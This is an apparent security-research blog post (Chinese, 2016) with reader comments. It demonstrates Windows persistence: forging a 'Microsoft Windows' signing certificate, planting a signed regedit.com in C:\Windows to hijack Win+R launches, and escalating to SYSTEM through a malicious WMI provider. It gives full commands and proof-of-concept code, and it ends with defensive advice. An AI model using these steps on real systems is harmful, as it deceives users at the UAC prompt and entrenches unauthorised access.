@@ -1,0 +1,64 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">A dirty way of tricking users to bypass UAC</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/05/13 10:26" ui-time="" datetime="2016/05/13 10:26" class="published ng-binding ng-isolate-scope">2016/05/13 10:26</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>我们都知道在获得了测试系统的管理员权限后，维持这个管理员权限的方法有很多，常见的如安装服务、驱动、利用wmi等等。</p><p>我在最近的研究过程中，结合学到的新知识，想到了一个有趣的方法———通过劫持系统程序，每当用户确认UAC允许系统程序(如regedit)运行时，测试程序(calc.exe)随即获得了管理员甚至是system权限。</p><p>演示如下：</p><p><img alt="Alt text" img-src="06C7_57350F0D1.gif"></p><p>下面就结合这个演示来介绍其中相关的技巧。</p><h1>0x01 简介</h1><hr><p>在获得了测试系统的管理员权限后（如通过漏洞），劫持系统默认程序（严格意义上不算劫持，此处为便于理解），当用户通过Win+R的方式输入程序名（如regedit）来执行一个需要管理员权限的程序（自Win7系统以来，UAC默认开启拦截此操作，需要用户点击确认对话框），测试程序随即获得了管理员甚至是system权限（不需要借助漏洞）。</p><p><strong>涉及到的技巧：</strong></p><ul><li>Certificate Generate and Enroll</li><li>.com extension hijack</li><li>add admin rights to a program</li><li>from admin to system</li></ul><h1>0x02 Certificate Generate and Enroll</h1><hr><p>关于生成和注册证书可以参考以下内容（同本文的生成方式不同）：</p><p><a href="https://labs.mwrinfosecurity.com/blog/masquerading-as-a-windows-system-binary-using-digital-signatures/">https://labs.mwrinfosecurity.com/blog/masquerading-as-a-windows-system-binary-using-digital-signatures/</a></p><p>介绍的很全面，但要注意在注册证书的地方有一个bug</p><h3>1、证书生成</h3><p><strong>( a )</strong> 准备工具</p><ul><li>makecert.exe</li><li>cert2spc.exe</li><li>pvk2pfx.exe</li><li>signtool.exe</li><li>certmgr.exe</li></ul><p><strong>注：</strong><br>Windows SDK默认包含以上工具<br>下载链接：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=8279">https://www.microsoft.com/en-us/download/details.aspx?id=8279</a></p><p><strong>( b )</strong> 生成一个自签名的根证书：</p><pre><code>#!bash
+makecert.exe -n "CN=Root" -r -sv RootIssuer.pvk RootIssuer.cer
+</code></pre><p><strong>( c )</strong> 使用这个证书签发一个子证书：</p><pre><code>#!bash
+makecert.exe -n "CN=Child" -iv RootIssuer.pvk -ic RootIssuer.cer -sv ChildSubject.pvk ChildSubject.cer -sky signature
+</code></pre><p><strong>( d )</strong> 公钥证书格式转换成SPC：</p><pre><code>#!bash
+cert2spc.exe ChildSubject.cer ChildSubject.spc
+</code></pre><p><strong>( e )</strong> 将公钥证书和私钥合并成一个PFX格式的证书文件：</p><pre><code>#!bash
+pvk2pfx.exe -pvk ChildSubject.pvk -pi test2 -spc ChildSubject.spc -pfx ChildSubject.pfx -f
+</code></pre><p><strong>( f )</strong> 为exe签名</p><pre><code>#!bash
+signtool sign /f ChildSubject.pfx /p test2 testav.exe
+</code></pre><p><strong>( g )</strong> 检查证书：</p><pre><code>#!bash
+certmgr.exe -c RootIssuer.cer
+</code></pre><p><strong>实例：</strong></p><pre><code>#!bash
+makecert -n "CN=Microsoft Windows" -r -sv Root.pvk Root.cer -b 01/30/2016 -e 01/01/2019
+cert2spc Root.cer Root.spc
+pvk2pfx -pvk Root.pvk -pi test -spc Root.spc -pfx Root.pfx -f
+signtool sign /f Root.pfx /p test test.exe
+</code></pre><p>执行后如图，生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件</p><p><img alt="Alt text" img-src="30603f098bc17d395e31a2ca59834e0388a6ed48.jpg"></p><p>test.exe被加上数字签名，如图</p><p><img alt="Alt text" img-src="12628c10315d0712ace89615d9f28e1c56e9ef23.jpg"></p><h3>2、证书注册</h3><p>自己生成的CA根证书默认不受信任，要启用信任，需要将该证书安装到“受信任的根证书颁发机构”存储区</p><p>证书注册可以通过以下方法：</p><p><strong>( a )</strong> 界面操作</p><p>查看证书-安装证书</p><p><strong>( b )</strong> 控制台操作</p><p>需要CertMgr.exe</p><p>普通权限cmd，将证书添加到当前用户：</p><pre><code>#!bash
+certmgr.exe -add -c RootIssuer.cer -s -r currentUser root
+</code></pre><p>会弹框提示，如图</p><p><img alt="Alt text" img-src="897d6b667dfc3387fad575506576e12844cb7f74.jpg"></p><p>管理员权限cmd，将证书添加到localmachine，不会弹框：</p><pre><code>#!bash
+certmgr.exe -add -c RootIssuer.cer -s -r localmachine root
+certmgr.exe -add -c ChildSubject.cer -s -r localmachine root
+</code></pre><h3>3、证书删除</h3><p>删除证书：</p><pre><code>#!bash
+certmgr.exe -del -c -n "Child" -s -r localMachine Root
+certmgr.exe -del -c -n "Root" -s -r localMachine Root
+</code></pre><p>删除root的时候会提示选择要删除的证书编号</p><p><strong>实例：</strong></p><p>将证书添加至localmachine，以管理员权限执行：</p><pre><code>#!bash
+certmgr.exe -add -c Root.cer -s -r localmachine root
+</code></pre><p>如图，test.exe的数字签名已被正常识别</p><p><img alt="Alt text" img-src="d47ef68ca771fcfc938a671c9163453b6021e4db.jpg"></p><h3>4、数字签名的作用</h3><p>为exe添加数字签名可直接影响UAC弹框的界面</p><p>比如将c:\windows\regedit.exe放在其他位置运行，会提示发布者未知</p><p>如图</p><p><img alt="Alt text" img-src="1786c6c718f818e851edb0e5984be74b3aa19549.jpg"></p><p>如果加上数字签名再运行，会显示已验证的发布者为：Microsoft Windows，如图</p><p><img alt="Alt text" img-src="a347c5dc0be31275b7f5dfb3282a07283eb25767.jpg"></p><p><strong>注：</strong><br>发布者名称：Microsoft Windows是通过上述方法伪造的</p><h1>0x03 .com extension hijack</h1><hr><p>在发现了数字签名会影响UAC界面显示的问题后，就猜想能否利用数字签名来伪装成系统程序，欺骗用户运行，如regedit</p><p>熟悉Windows的人都知道运行regedit最快捷的方法为Win+r，输入regedit</p><p><strong>那么我们能否利用这个操作呢？</strong></p><p>从<a href="http://fileinfo.com/extension/com">http://fileinfo.com/extension/com</a>获得有关COM文件的介绍：</p><blockquote><p>A COM file is an executable program capable of being run by MS-DOS and Windows. It is saved in a binary format and is similar to an .EXE file, but differs in that it has a maximum size of roughly 64KB and it has no header or metadata. The file is commonly used for executing a set of instructions whereas EXE files are used for fully developed programs. If a folder includes both EXE and COM files with the same filename (e.g., run.exe and run.com), the DOS or Windows command prompt will run the COM file if you type the filename without the extension.</p></blockquote><p>如果一个路径下同时包含同名的exe和com文件，会优先运行com文件</p><p>也就是说只要在c:\windows下写入一个regedit.com文件，就会在regedit.exe之前执行，也就实现了一定意义上的劫持</p><p>而COM文件的生成只需要把exe文件的后缀名改为com即可</p><p>基于以上的分析，产生一个思路：<strong>只要伪造一个regedit.com并放于c:\windows下，就可以在用户通过win+r输入regedit时优先运行我们自己的程序</strong></p><h1>0x04 add admin rights to a program</h1><hr><p><strong>开发环境：</strong>Visual Studio 2015</p><p><strong>poc：</strong></p><pre><code>#!cpp
+#include "Windows.h"
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+    _In_opt_ HINSTANCE hPrevInstance,
+    _In_ LPWSTR    lpCmdLine,
+    _In_ int       nCmdShow)
+{
+    WinExec("regedit", SW_SHOW);
+    WinExec("cmd", SW_SHOW);
+    return 0;
+}
+</code></pre><p>执行会运行regedit.exe和cmd.exe，regedit需要管理员权限，程序的默认权限无法执行regedit</p><p>下面就为程序赋予admin权限：</p><p>右击工程属性——配置属性——链接器——清单文件，找到UAC执行级别</p><p>如图</p><p><img alt="Alt text" img-src="793063134843bb3bc54e8422ce13ab74b1dfff01.jpg"></p><p>设置为requireAdministrator</p><p>如图</p><p><img alt="Alt text" img-src="7f5a23ed8801b370d63d491c0700b9b5c0af97d6.jpg"></p><p>重新生成，产生新文件，图标上会添加uac的标志，如图</p><p><img alt="Alt text" img-src="2173e52bf3ca518cdf70d124cd25eb3e5be5c4bc.jpg"></p><p>将程序后缀名修改为com，图标消失</p><p>如图</p><p><img alt="Alt text" img-src="c461cc21c7c2cdcf24de1aa6504104304a78b2f3.jpg"></p><p>双击运行，弹出uac拦截框，提示发布者：未知，如图</p><p><img alt="Alt text" img-src="0aa230c55f955f04db079909f6442141c094a245.jpg"></p><p>接下来为程序添加数字签名，再次运行，成功解决发布者未知的问题</p><p>但是新的问题产生：程序名称无法伪造，显示为Win32Project5.com</p><p>如图</p><p><img alt="Alt text" img-src="a47337ef2f567d6df8985e4b05147ad29e5af475.jpg"></p><p><strong>解决方法：</strong></p><p>为程序添加说明文件</p><p>c++工程文件-添加-资源-Version</p><p>修改File Decription为Registry Editor</p><p>如图</p><p><img alt="Alt text" img-src="46f99139abc4356a2219db4a97c0cc2241273408.jpg"></p><p>再次重新生成文件并签名，后缀名改为com</p><p>执行，已经同正常的regedit.exe相似，如图</p><p><img alt="Alt text" img-src="7294a00e0e7218f6b1d03b00868ac3c1502dd85a.jpg"></p><p>完整的演示如图，此时弹出的cmd权限为管理员权限</p><p><img alt="Alt text" img-src="633E_57350F0D1.gif"></p><h1>0x05 from admin to system</h1><hr><p>我使用的方法为：EvilNetConnectionWMIProvider</p><p>地址为：<a href="https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider">https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider</a></p><p>原工程为以system权限执行cmd，这里简单修改一下把内容替换为启动calc.exe</p><p>EvilNetConnectionWMIProvider.cs中的RunPS作如下修改：</p><pre><code>#!csharp
+    public static string RunPS(string cmd)
+    {
+        System.Diagnostics.Process.Start("c:\\windows\\system32\\calc.exe");
+
+
+        return cmd;
+    }
+</code></pre><p>编译生成EvilNetConnectionWMIProvider.dll</p><p>安装：<br>( 需要管理员权限 )</p><pre><code>#!bash
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /i EvilNetConnectionWMIProvider.dll
+</code></pre><p>卸载:<br>( 需要管理员权限 )</p><pre><code>#!bash
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /u EvilNetConnectionWMIProvider.dll
+</code></pre><p><strong>注：</strong><br>卸载存在bug，再次注册使用需要修改AssemblyInfo.cs中的assembly: Guid</p><p>调用wmi控件：<br>( 需要管理员权限 )</p><pre><code>#!bash
+powershell Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "whoami", $NULL
+</code></pre><p>会打开一个system权限的calc.exe</p><p>因此0x04中完整的c++程序代码如下：</p><pre><code>#!cpp
+#include "Windows.h"
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+    _In_opt_ HINSTANCE hPrevInstance,
+    _In_ LPWSTR    lpCmdLine,
+    _In_ int       nCmdShow)
+{
+    WinExec("regedit", SW_SHOW);
+    WinExec("cmd /c powershell.exe Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList ""whoami"", $NULL", SW_HIDE);
+    return 0;
+}
+</code></pre><p>按照上述流程就可以实现劫持用户通过win+r执行regedit的输入，在启动正常regedit.exe的同时在后台运行一个system权限的calc.exe</p><p><img alt="Alt text" img-src="06C7_57350F0D1.gif"></p><h1>0x06 防御</h1><hr><p>对照上述流程，可结合实现需要的条件进行防御</p><h3>1、控制管理员权限</h3><p>注册证书、在c:\windows（%windir%）下写文件的操作都需要管理员权限</p><h3>2、证书管理</h3><p>查看系统是否有不受信任的伪造证书</p><p>win+r输入certmgr.msc，进入证书管理，查看系统安装的证书</p><h3>3、可疑文件</h3><p>查看c:\windows（%windir%）下是否有同系统程序的名称相同，后缀名为com的文件</p><p>com文件启动和系统程序启动弹出的UAC对话框中的图标存在差别（相信很多人都没有发现T_T）</p><p>正常的：</p><p><img alt="Alt text" img-src="631df6d1bc7d36d0941b274031590bb28e7aaab8.jpg"></p><p>伪造的：</p><p><img alt="Alt text" img-src="12589ee30317b023ac0a3a0a975e66c5ffe0f8db.jpg"></p><h3>4、服务管理</h3><p>from admin to system需要通过InstallUtil.exe来注册服务</p><h3>5、运行方式</h3><p>通过win+r启动程序的时候，记得输入全称+后缀名，这样就可以避免被同名的com文件劫持</p><h1>0x07 小结</h1><hr><p>本文只是对regedit的劫持做了演示，结合实际攻击的方式还有很多，但只要了解细节后再进行防御就不难。希望本文能让大家有所启发。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">intC</span> <span class="reply-time">2016-05-17 09:49:40</span></div><p></p><p>原谅我没有看到第一句话</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Rubick</span> <span class="reply-time">2016-05-16 09:47:25</span></div><p></p><p>当我没说，没看第一句话</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Rubick</span> <span class="reply-time">2016-05-16 09:41:27</span></div><p></p><p>方法值得借鉴，但有一个地方逻辑似乎有点问题，你都能把.com文件放进c:\windows，还需要绕过UAC么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱睡懒觉猫十六</span> <span class="weibo"></span> <span class="reply-time">2016-05-13 13:35:48</span></div><p></p><p>Regular Show！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2016-05-13 11:39:03</span></div><p></p><p>zan</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mark</span> <span class="reply-time">2016-05-13 11:30:25</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">aqweqw</span> <span class="reply-time">2016-05-13 11:20:34</span></div><p></p><p>算一种奇技淫巧吧，实际利用价值有限，我只好奇这样签名出来的驱动，系统会认为是拥有正常签名的驱动而加载么</p><p></p></div></div></div></div></div></main>
